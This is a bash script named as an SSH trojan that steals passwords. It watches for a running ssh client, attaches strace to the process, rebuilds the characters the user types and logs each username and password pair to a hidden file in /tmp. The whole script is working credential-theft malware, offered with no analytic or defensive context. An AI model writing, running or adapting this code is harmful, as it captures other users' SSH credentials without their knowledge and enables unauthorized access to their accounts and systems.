#!/bin/bash
file_log="/tmp/.log_sshtrojan2.txt"
file_log2="/tmp/log.txt"
if [[ -e $file_log ]]; then
    rm $file_log
fi
if [[ -e $file_log2 ]]; then
    rm $file_log2
fi
echo "Running..."
while true :
do
    pid=`ps aux | grep -w ssh | grep @ | head -n1 | awk '{print $2}'`
    if [[ $pid != "" ]]; then
        echo $pid
        username=`ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d '@' -f1`
        echo 'Run Strace'
        password=""
        strace -e trace=read,write -p $pid -f -o $file_log2
        cat $file_log2 | while read line; do 
            if [[ $line =~ "read(4, ".*", 1)" ]]; then
                c=`echo $line | awk '{print $3}' | cut -d'"' -f2`
                if [[ $c == "n" ]];then
                    echo "Username: " $username >> $file_log
                    echo "Password: " $password >> $file_log
                    password=""
                else
                    password+=$c
                fi
            fi
        done
    fi
done
